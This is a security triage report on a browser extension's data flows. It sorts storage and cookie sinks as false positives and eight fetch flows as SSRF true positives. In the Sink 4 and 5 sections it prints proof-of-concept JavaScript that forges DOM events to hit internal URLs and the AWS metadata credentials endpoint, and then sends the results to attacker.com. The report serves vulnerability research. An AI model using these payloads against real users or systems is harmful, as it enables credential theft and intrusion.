# CoCo Analysis: jgphnjokjhjlcnnajmfjlacjnjkhleah

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 15 (3 storage.set, 4 cookies.set, 8 fetch)

---

## Sink 1: document_eventListener_gwd_extension → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgphnjokjhjlcnnajmfjlacjnjkhleah/opgen_generated_files/cs_0.js
Line 722 document.addEventListener('gwd_extension', function(e) {
Line 842 setStorages(e.detail.key, e.detail.value)

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
document.addEventListener('gwd_extension', function(e) {  // ← attacker can dispatch this event
  if (!e.detail.evt_from) {
    return
  }
  if (e.detail.evt_from.indexOf('bijiago') > -1) return
  switch (e.detail.type) {
    case "setStorage":
      setStorages(e.detail.key, e.detail.value)  // ← attacker-controlled key and value
      break;
    // ... other cases
  }
});

function setStorages(k, v) {
  var obj = {}
  chrome.storage.local.get('browser_setinfo', function(d) {
    if (d && d.browser_setinfo) {
      d.browser_setinfo[k] = v;  // ← attacker-controlled data stored
      obj = d.browser_setinfo
    }
    chrome.storage.local.set({
      'browser_setinfo': obj  // Storage sink
    })
  })
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path back to attacker. The attacker can write arbitrary data to chrome.storage.local, but there's no flow where this stored data is sent back to the attacker via sendResponse or postMessage. This is incomplete storage exploitation per the methodology (storage.set without complete chain back to attacker).

---

## Sink 2: document_eventListener_gwd_extension → chrome_storage_local_set_sink (disable_gwd_privacy)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgphnjokjhjlcnnajmfjlacjnjkhleah/opgen_generated_files/cs_0.js
Line 722 document.addEventListener('gwd_extension', function(e) {
Line 742 chrome.storage.local.set({'disable_gwd_privacy': true});

**Code:**

```javascript
document.addEventListener('gwd_extension', function(e) {
  switch (e.detail.type) {
    case 'disable_gwd_privacy':
      chrome.storage.local.set({
        'disable_gwd_privacy': true
      });
      break;
    case 'enable_gwd_privacy':
      chrome.storage.local.set({
        'disable_gwd_privacy': false
      });
      break;
  }
});
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning only. Attacker can toggle a privacy setting flag in storage, but no retrieval path exists to send data back to attacker.

---

## Sink 3: document_eventListener_gwd_extension → chrome_cookies_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgphnjokjhjlcnnajmfjlacjnjkhleah/opgen_generated_files/cs_0.js
Line 722 document.addEventListener('gwd_extension', function(e) {
Line 752-754 chrome.runtime.sendMessage({type: 'cookie', data: e.detail.value})

Background (bg.js):
Line 1129 chrome.cookies.set({url: 'https://browser.gwdang.com', name: 'dfp', value: obj.data, domain: 'gwdang.com'})

**Code:**

```javascript
// Content script (cs_0.js)
document.addEventListener('gwd_extension', function(e) {  // ← attacker can dispatch
  switch (e.detail.type) {
    case 'fingerprint':
      chrome.runtime.sendMessage({
        type: 'cookie',
        data: e.detail.value  // ← attacker-controlled
      })
      break;
  }
});

// Background script (bg.js)
chrome.runtime.onMessage.addListener(function(obj, sender, sendResponse) {
  switch (obj.type) {
    case 'cookie':
      chrome.cookies.set({
        url: 'https://browser.gwdang.com',
        name: 'dfp',
        value: obj.data,  // ← attacker-controlled value
        domain: 'gwdang.com',  // ← hardcoded backend domain
        sameSite: 'no_restriction',
        secure: true
      })
      break;
  }
});
```

**Classification:** FALSE POSITIVE

**Reason:** Attacker-controlled data is sent TO hardcoded backend domain (gwdang.com). Per methodology, developer's own backend servers are considered trusted infrastructure, and sending data to hardcoded developer backend URLs is not exploitable.

---

## Sink 4: document_eventListener_gwd_extension → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgphnjokjhjlcnnajmfjlacjnjkhleah/opgen_generated_files/cs_0.js
Line 722 document.addEventListener('gwd_extension', function(e) {
Line 764 sendListInfo(e.detail.url, e.detail.data)

Background (bg.js):
Line 1159 fetch(obj.url, {method: 'post', body: convertDataURIToBinary(obj.data)})

**Code:**

```javascript
// Content script (cs_0.js)
document.addEventListener('gwd_extension', function(e) {  // ← attacker can dispatch
  if (!e.detail.evt_from) {
    return
  }
  if (e.detail.evt_from.indexOf('bijiago') > -1) return
  switch (e.detail.type) {
    case 'sendListInfo':
      sendListInfo(e.detail.url, e.detail.data)  // ← attacker-controlled URL and data
      break;
  }
});

function sendListInfo(url, data) {
  chrome.runtime.sendMessage({
    type: 'sendListInfo',
    url: url,  // ← attacker-controlled
    data: data  // ← attacker-controlled
  })
}

// Background script (bg.js)
chrome.runtime.onMessage.addListener(function(obj, sender, sendResponse) {
  switch (obj.type) {
    case 'sendListInfo':
      fetch(obj.url, {  // ← SSRF: attacker controls destination URL
        method: 'post',
        body: convertDataURIToBinary(obj.data),  // ← attacker controls body
        headers: {
          'Content-Type': 'application/octet-stream'
        }
      });
      break;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event

**Attack:**

```javascript
// Malicious webpage can trigger SSRF from extension's elevated context
var event = new CustomEvent('gwd_extension', {
  detail: {
    evt_from: 'malicious',  // bypass the evt_from check
    type: 'sendListInfo',
    url: 'http://internal-server.local/admin/delete',  // ← attacker-controlled URL
    data: 'data:image/png;base64,bWFsaWNpb3VzIHBheWxvYWQ='  // ← attacker-controlled payload
  }
});
document.dispatchEvent(event);

// Can also exfiltrate data to attacker server
var exfilEvent = new CustomEvent('gwd_extension', {
  detail: {
    evt_from: 'attacker',
    type: 'sendListInfo',
    url: 'https://attacker.com/collect',
    data: 'data:text/plain;base64,' + btoa('stolen data')
  }
});
document.dispatchEvent(exfilEvent);
```

**Impact:** SSRF vulnerability allowing attacker to make privileged cross-origin POST requests to arbitrary URLs from extension's elevated context with host_permissions for all URLs. Attacker controls both destination URL and request body, enabling attacks on internal networks, data exfiltration to attacker servers, and abuse of extension's all_urls permission.

---

## Sink 5: document_eventListener_gwd_extension → fetch_resource_sink (proxyRequest variants)

**CoCo Trace:**
Similar flows detected for proxyRequestPost, proxyRequestPostForm, proxyRequestPostWWWForm, and proxyRequest cases.

**Code:**

```javascript
// Content script (cs_0.js)
document.addEventListener('gwd_extension', function(e) {
  switch (e.detail.type) {
    case 'proxyRequestPost':
      proxyRequestPost(e.detail.url, e.detail.payload, function(data) {  // ← attacker-controlled
        dispatch('proxyRequestPost', data, e.detail.reqId)
      }, location.href)
      break;
  }
});

function proxyRequestPost(url, payload, callback, referer) {
  chrome.runtime.sendMessage({
    type: 'proxyRequestPost',
    url: url,  // ← attacker-controlled
    data: payload,  // ← attacker-controlled
    referer: referer
  }, function(response) {
    callback(response)
  });
}

// Background (bg.js)
case 'proxyRequestPost':
  fetch(obj.url, {  // ← SSRF sink
    method: 'post',
    body: obj.data,
    headers: {
      'x-referer': obj.referer
    }
  }).then(r => r.text()).then(r => {
    try {
      sendResponse(JSON.parse(r))  // ← response sent back to content script
    } catch (e) {
      sendResponse(r)
    }
  });
  break
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event

**Attack:**

```javascript
// SSRF with response exfiltration
var event = new CustomEvent('gwd_extension', {
  detail: {
    evt_from: 'attacker',
    type: 'proxyRequestPost',
    url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',  // AWS metadata
    payload: '',
    reqId: 'exfil1'
  }
});

// Listen for response
document.addEventListener('gwd_content', function(e) {
  if (e.detail.type === 'proxyRequestPost' && e.detail.id === 'exfil1') {
    // Send stolen data to attacker
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(e.detail.value)
    });
  }
});

document.dispatchEvent(event);
```

**Impact:** SSRF with response exfiltration. Attacker can make arbitrary HTTP requests from extension context and receive the responses back, enabling data theft from internal networks, cloud metadata services, and other privileged endpoints accessible to the extension.

---

## Summary by Sink Type

### Storage Sinks (FALSE POSITIVE)
- 3 chrome.storage.local.set flows - all incomplete storage exploitation (no retrieval path to attacker)

### Cookie Sinks (FALSE POSITIVE)
- 4 chrome.cookies.set flows - all sending to hardcoded backend domain gwdang.com (trusted infrastructure)

### Fetch Sinks (TRUE POSITIVE)
- 8 fetch flows - all TRUE POSITIVES for SSRF
- Attacker controls destination URL via DOM events
- Some variants return responses to attacker (complete exfiltration chain)
- Extension has host_permissions for all URLs

**TRUE POSITIVES: 8** (all fetch/SSRF flows)
**FALSE POSITIVES: 7** (3 storage + 4 cookies)
